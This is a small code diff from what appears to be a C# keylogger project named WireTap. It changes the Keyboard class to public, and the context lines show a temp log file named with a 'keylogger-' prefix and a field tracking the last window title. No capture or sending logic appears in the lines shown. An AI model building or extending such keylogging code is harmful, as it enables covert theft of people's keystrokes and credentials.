@@ -8,7 +8,7 @@ using System.Diagnostics;
 
 namespace WireTap
 {
-    class Keyboard
+    public class Keyboard
     {
         public static string logName = Helpers.CreateTempFileName(".log", "keylogger-");
         public static string lastTitle = "";
